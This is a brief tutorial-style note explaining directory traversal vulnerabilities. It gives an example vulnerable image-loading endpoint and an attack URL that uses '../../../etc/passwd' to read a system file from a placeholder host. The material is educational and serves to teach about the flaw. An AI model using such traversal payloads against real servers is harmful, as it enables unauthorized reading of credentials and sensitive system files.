# Path traversal

Directory traversal vulnerabilities enable an attacker to read arbitrary files
on the server that is running an application.

This might include:
- Application code and data
- Credentials for back-end systems
- Sensitive operating system files

## Exploitation

This application implements no defenses against path traversal attacks
```html
<img src="/loadImage?filename=218.png">
```

An attacker can request the following URL to retrieve a file
```http
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```

This causes the application to read from the following path
```
/var/www/images/../../../etc/passwd
```
